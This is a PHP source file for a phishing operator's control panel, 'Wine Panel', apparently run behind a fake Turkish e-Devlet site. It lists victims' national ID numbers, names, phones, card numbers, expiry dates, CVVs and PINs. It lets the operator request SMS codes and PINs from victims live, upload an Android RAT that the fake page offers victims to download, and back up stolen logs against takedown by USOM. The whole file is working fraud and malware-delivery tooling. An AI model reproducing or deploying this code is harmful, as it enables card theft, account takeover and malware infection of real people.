<?php
error_reporting(0);
include("../baglan.php");
date_default_timezone_set('Europe/Istanbul');
$Zaman = date('H:i');
session_start();
ob_start();
$sifreVeri = $db->query("SELECT * FROM panel WHERE id = '1'")->fetch(PDO::FETCH_ASSOC);
$sifre1 = $sifreVeri['sifre'];
$sn = $sifreVeri['saniye'];
if(isset($_GET['Rat']) || isset($_GET['Set']) || isset($_GET['Back'])){
header("Refresh:5000;");
}else{
header("Refresh:$sn;");
}
foreach($db->query('select * from logs') as $log){
if($log['bildirim']=='1'){ ?>
<audio id="audioplayer" autoplay=true><source src="main/wine.mp3" type="audio/mpeg"></audio>
<div id="Box">(<?=$Zaman?>) Yeni Log Girildi</div>
<?php $db->query("update logs set bildirim='0'");
} } 
if(!isset($_SESSION["login"])){
header('Location:login.php');
}
if(isset($_GET['Out'])){
session_start();
ob_start();
session_unset();
session_destroy();
header('Location:login.php');
}
$query=$db->prepare('SELECT * FROM logs ORDER BY id DESC');
$query->execute();
$list=$query->fetchAll(PDO::FETCH_ASSOC);
$LSayi = $query->rowCount();
if(isset($_GET['del'])){
$del = $_GET['del'];
$db->query("DELETE FROM logs WHERE id='$del'");
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['ban'])){
$ban = $_GET['ban'];
$db->query("insert into ban (ban) values ( '$ban')");
?><div id="Box">(<?=$Zaman?>) Sazan Banlandı</div>
<?php  header('Refresh:2; url=index.php');
}
if(isset($_GET['Die'])){
$Die = $_GET['Die'];
$db->query("truncate table logs");
$db->query("truncate table sms");
$db->query("truncate table sms2");
$db->query("truncate table pin");
$db->query("truncate table tebrik");
$db->query("truncate table hata");
$db->query("truncate table ban");
?><div id="Box">(<?=$Zaman?>) Tümü Sıfırlandı</div>
<?php  header('Refresh:2; url=index.php');
}
if(isset($_GET['pin'])){
$pin = $_GET['pin'];
$db->query("insert into pin (pin) values ( '$pin')");
?><div id="Box">(<?=$Zaman?>) PIN İstendi</div>
<?php  header('Refresh:2; url=index.php');
}
if(isset($_GET['sms'])){
$sms = $_GET['sms'];
$db->query("insert into sms (sms) values ( '$sms')");
?><div id="Box">(<?=$Zaman?>) SMS İstendi</div>
<?php  header('Refresh:2; url=index.php');
}
if(isset($_GET['sms2'])){
$sms2 = $_GET['sms2'];
$db->query("insert into sms2 (sms2) values ( '$sms2')");
?><div id="Box">(<?=$Zaman?>) SMS2 İstendi</div>
<?php  header('Refresh:2; url=index.php');
}
if(isset($_GET['tebrik'])){
$tebrik = $_GET['tebrik'];
$db->query("insert into tebrik (tebrik) values ( '$tebrik')");
?><div id="Box">(<?=$Zaman?>) Tebrik Edildi</div>
<?php  header('Refresh:2; url=index.php');
}
if(isset($_GET['hata'])){
$hata = $_GET['hata'];
$db->query("insert into hata (hata) values ( '$hata')");
?><div id="Box">(<?=$Zaman?>) Hata Verildi</div>
<?php  header('Refresh:2; url=index.php'); } 
?>
<html>
<head>
<title>Wine Panel</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="shortcut icon" href="main/favicon.png" />
<link href="https://fonts.googleapis.com/css2?family=Open+Sacns&display=swap" rel="stylesheet">
<script src="https://code.jquery.com/jquery-1.10.2.js"></script>
<script>
    $(function() {
        $('.modalBtn').on('click', function() {
            var file_data = $('.apkFile').prop('files')[0];
            if(file_data != undefined) {
                var form_data = new FormData();                  
                form_data.append('file', file_data);
                $.ajax({
                    type: 'POST',
                    url: 'upload.php',
                    contentType: false,
                    processData: false,
                    data: form_data,
                    success:function(response) {
                        if(response == 'success') {
                          alert('Dosya Sunucuya Yüklendi ve Panel Güncellendi!');
                        } else if(response == 'false') {
                          alert('HATA! Sadece .APK Uzantısı Geçerlidir!');
                        } else {
                            alert('Bilinmeyen Hata Oluştu!');
                        }
 
                        $('.apkFile').val('');
                    }
                });
            }
            return false;
        });
    });
</script>
<style>
*{
  font-family: 'Open Sans', sans-serif;
}
body {
  margin: 0;
  font-family: Arial, Helvetica, sans-serif;
}
a{
  text-decoration:none;
  color:#fff;
}
.topnav {
  overflow: hidden;
  border-bottom:1px solid #ddd;
  border-right:1px solid #ddd;
  border-left:1px solid #ddd;
  width: 96%;
  margin:auto;
}

.topnav a {
  float: left;
  color: #333;
  text-align: center;
  padding: 14px 16px;
  text-decoration: none;
  font-size: 17px;
  float:right;
}

.topnav a:hover {
  background-color: #eee;
  color: black;
}
#Box{
  background:#63c77e;
  color:#fff; 
  padding:8px;
  float:center;
  text-align:center;
  left:0;
  font-weight:500;
  margin:0 auto;
  right:0;
  width:300px;
  border:1px solid #63c77e;
  position:fixed;
}
</style>
</head>
<body>

<div class="topnav">
  <a style="float:left;" href="index.php"><img src="main/wine.png" width="118"></a>
  <a href="?Out"><img src="main/exit.png" width="44"></a>
  <a href="?Die"><img src="main/delete.png" width="44"></a>
  <a href="?Set" id="myBtn1"><img src="main/settings.png" width="44"></a>
  <a href="?Rat" id="myBtn"><img src="main/android.png" width="44"></a>
  <a href="backup.php"><img src="main/backup.png" width="44"></a>
</div>
<br><br>
<style>
table {
  border-collapse: collapse;
  width: 96%;
  margin:auto;
}

th, td {
  text-align: left;
  padding: 8px;
  border:1px solid #ddd;
  font-weight:400;
}

th {
  background-color: #329da8;
  color: white;
  border:1px solid #329da8;
}

button{
    padding:2px 5px 2px 5px;
    background-color: #329da8;
  color: white;
  border:1px solid #329da8;
  outline:none;
  cursor:pointer;
  border-radius:3px;
}
.modal {
  display: none;
  position: fixed;
  z-index: 1;
  left: 0;
  top: 0;
  width: 100%;
  height: 100%;
  overflow: auto;
  background-color: rgb(0, 0, 0);
  background-color: rgba(0, 0, 0, 0.4);  
}

.modal-content {
  color: #414242;
  margin: 4% auto;
  padding: 30px 60px;
  width: 500px;
  font-family: Sans-serif;
  font-size: 16px;
  line-height: 28px;
  letter-spacing: 0.5px;
  -webkit-font-smoothing: antialiased;
  background: #FFFFFF;
  border: 1px solid #9B9C9D;
  box-shadow: 0px 2px 6px 0px rgba(0,0,0,0.20);
  border-radius: 6px;
}

.modal-content a {
  color: #636464;
}

.modal-content > h2 {
  display: block;
  width: 100%;
  text-align: left;
}
.modalTxt{
  border: 1px solid #fc4c02;
  border-radius: 3px;
  background: #fff;
  color: #fc4c02;
  font-size: 15px;
  padding: 6px;
  outline:none;
}
.modalBtn {
  border: 1px solid #fc4c02;
  border-radius: 3px;
  background: #fff;
  color: #fc4c02;
  font-size: 15px;
  height: 38px;
  padding: 0 12px;
  cursor: pointer;
}
.modalBtn2 {
  border: 1px solid #fc4c02;
  border-radius: 3px;
  background: #fff;
  color: #fc4c02;
  font-size: 15px;
  height: 38px;
  padding: 0 12px;
  cursor: pointer;
}
</style>
<div id="myModal1" class="modal">
  <?php
    if(isset($_POST['sifre'])){

      $sifre = $_POST['sifre'];
      $saniye = $_POST['saniye'];
      $stmt= $db->query("UPDATE panel SET sifre='$sifre', saniye='$saniye' WHERE id='1'");
      header('Location:index.php?Set');
    }
    if(isset($_GET['Del'])){
      if(file_exists('APK/eDevlet.apk')) {
      unlink('APK/eDevlet.apk');
      ?>
      <script>alert('APK Silindi Ve Panelden Kaldırıldı');</script>
      <?php 
      }else{
        ?>
        <script>alert('Herhangi bir APK Dosyanız Bulunamadı');</script>
        <?php
      }
    } ?>
  <div class="modal-content">
    <h2>
    Panel Ayarları
    </h2>
    <form action="?Set" method="post">
    <input type="password" name="sifre" class="modalTxt" placeholder="Panel Şifresi" required/><span> &nbsp;Şifre: <?=$sifre1?></span><br><br>
    <input type="number" name="saniye" class="modalTxt" placeholder="Otomatik Yenileme (sn.)" required/><span> &nbsp;<?=$sn?> sn.</span><br><br>
    <span class="Alert"></span>
    <button class="modalBtn2" type="submit">
      Güncelle
    </button>
     <button type="button" class="modalBtn" id="Close1">
      Kapat
    </button>
</div>
</div>
</form>
<div id="myModal" class="modal">
<form action="upload.php" method="post" enctype="multipart/form-data">
  <div class="modal-content">
    <h2>
    APK RAT Yerleştir
    </h2>
    <p>Mevcut APK Ratınızı buradan yüklerseniz Tebrik sayfasında Butona gömülür ve sizin APK dosyanızı indirmiş olur.</p>
    <p>
    <input style="width:190px;" type="file" name="apkFile" class="apkFile"> <a href="?Rat&Del" class="modalBtn2" style="color:#fc4c02;font-size:13;padding:5px;"> APK Sil</a>&nbsp;
    </p>
    <button type="submit" class="modalBtn">
      Yerleştir
    </button>
    <button type="button" class="modalBtn" name="submit" id="Close">
      Kapat
    </button><br><br>
    <span style="font-family:'Open Sans',sans-serif;font-size:12;line-height:1.5;">
    <?php if(file_exists('APK/eDevlet.apk')){ ?>
    Yüklediğiniz bir APK Dosyası bulunuyor. Yeni bir APK dosyası yüklerseniz Var olan Apk dosyası silinecek ve yenisi yerleştirilecektir. Eğer APK Dosyasını silerseniz Tebrik sayfasından Uygulama İndir Butonu kalkacaktır.
    <?php }else{ ?>
    Yüklediğiniz bir APK Dosyası bulunmuyor. Yüklediğiniz an E-Devlet paneli güncellenecek ve Tebrik sayfasında butona APK dosyanız yerleştirilecektir.
    <?php } ?>
    </span>
</div>
</div>
</form>
<div id="myModal2" class="modal">
<?php
    if($_POST['ExType']){
      $filepath = 'backup/backup.txt';
      $filepath2 = 'backup/backup.sql';
      @$ExType = $_POST['ExType'];
      if($ExType=='1'){
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($filepath));
        flush();
        readfile($filepath);
        die();
      }else{
        header('Content-Description: File Transfer');
        header('Content-Type: application/x-sql');
        header('Content-Disposition: attachment; filename="'.basename($filepath2).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($filepath2));
        flush();
        readfile($filepath2);
        die();
      }
      header('Location:index.php?Set');
    }
  ?>
<form action="?Back" method="post">
  <div class="modal-content">
    <h2>
    Logları Yedekle
    </h2>
    <p>Her an panelin USOM yemesine / Kapanmasına karşı Paneldeki Logları yedekleyebilirsin.</p>
    <select class="modalBtn" name="ExType">
      <option value="1">TXT Dosyasına Yazdır</option>
      <option value="2">SQL Dosyasına Yazdır</option>
    </select><br><br>
    <button type="submit" class="modalBtn2">
      Yedekle
    </button>
    <button type="button" class="modalBtn" id="Close2">
      Kapat
    </button>
</div>
</form>
</div>
<script>
var modal = document.getElementById('myModal');
var modal1 = document.getElementById('myModal1');
var modal2 = document.getElementById('myModal2');
var btn = document.getElementById("myBtn");
var btn1 = document.getElementById("myBtn1");
var close = document.getElementById("Close");
var close1 = document.getElementById("Close1");
var close2 = document.getElementById("Close2");
<?php if(isset($_GET['Rat'])){ ?>
  modal.style.display = "block";
<?php } ?>
close.onclick = function() {
  modal.style.display = "none";
  window.location = "index.php";
}
<?php if(isset($_GET['Set'])){ ?>
  modal1.style.display = "block";
<?php } ?>
close1.onclick = function() {
  modal1.style.display = "none";
  window.location = "index.php";
}
<?php if(isset($_GET['Back'])){ ?>
  modal2.style.display = "block";
<?php } ?>
close2.onclick = function() {
  modal2.style.display = "none";
  window.location = "index.php";
}
</script>

<table>
  <tr>
    <th>ID</th>
    <th>Sayfa</th>
    <th>TCKN</th>
    <th>Ad Soyad</th>
    <th>TEL</th>
    <th>KK</th>
    <th>Limit</th>
    <th>PIN</th>
    <th>SMS</th>
    <th>SMS2</th>
    <th>Tarih</th>
    <th>IP</th>
    <th>İşlem</th>
  </tr>
  <?php 
  if($LSayi == 0){
  echo '<tr><td colspan="13"><font color="dodgerblue">&raquo;</font> Veritabanında Hiçbir veri bulunamadı.</td></tr>';
  }else{ 
  foreach($list as $logs){
$formatBin = str_replace(' ','',$logs['kk']);
$BIN = substr($formatBin,0,6);
$kk = str_replace(' ','',$logs['kk']);
$skt = str_replace(' ','',$logs['skt']);
?>

  <tr>

    <td><?=$logs['id']?> <a style="color:#329da8;font-weight:bold;" href="lookup.php?BIN=<?=$BIN?>">&raquo;BIN</a></td>
    <td><?=$logs['sayfa']?></td>
    <td><?=$logs['tckn']?></td>
    <td><?=$logs['adsoyad']?></td>
    <td><?=$logs['tel']?></td>
    <td style="color:#666;"><b><?=$kk.'</b><br>'.$skt.' '.$logs['cvv']?></td>
    <td><?=$logs['limitt']?></td>
    <td><?php if($logs['pin'] == null){ ?>
              <a href="?pin=<?php echo $logs['ip'];?>">
                  <button>Talep</button></a>
              <?php }else { echo '<font color="green">'.$logs['pin'].'</font>'; } ?>
     </td>
     <td><?php if($logs['sms'] == null){ ?>
              <a href="?sms=<?php echo $logs['ip'];?>">
                  <button>Talep</button></a>
              <?php }else { echo '<font color="green">'.$logs['sms'].'</font>'; } ?>
     </td>
     <td><?php if($logs['sms2'] == null){ ?>
              <a href="?sms2=<?php echo $logs['ip'];?>">
                  <button>Talep</button></a>
              <?php }else { echo '<font color="green">'.$logs['sms2'].'</font>'; } ?>
     </td>
    <td><?=$logs['tarih']?></td>
    <td><?=$logs['ip']?></td>
    <td>
        <button><a href="?tebrik=<?=$logs['ip']?>">Tebrik</a></button>
        <button><a href="?hata=<?=$logs['ip']?>">Hata</a></button>
        <button><a href="?ban=<?=$logs['ip']?>">BAN</a></button>
        <button><a href="?del=<?=$logs['id']?>">SIL</a></button>
    </td>
    
  </tr>
  <?php } } ?>


</table>

</body>
</html>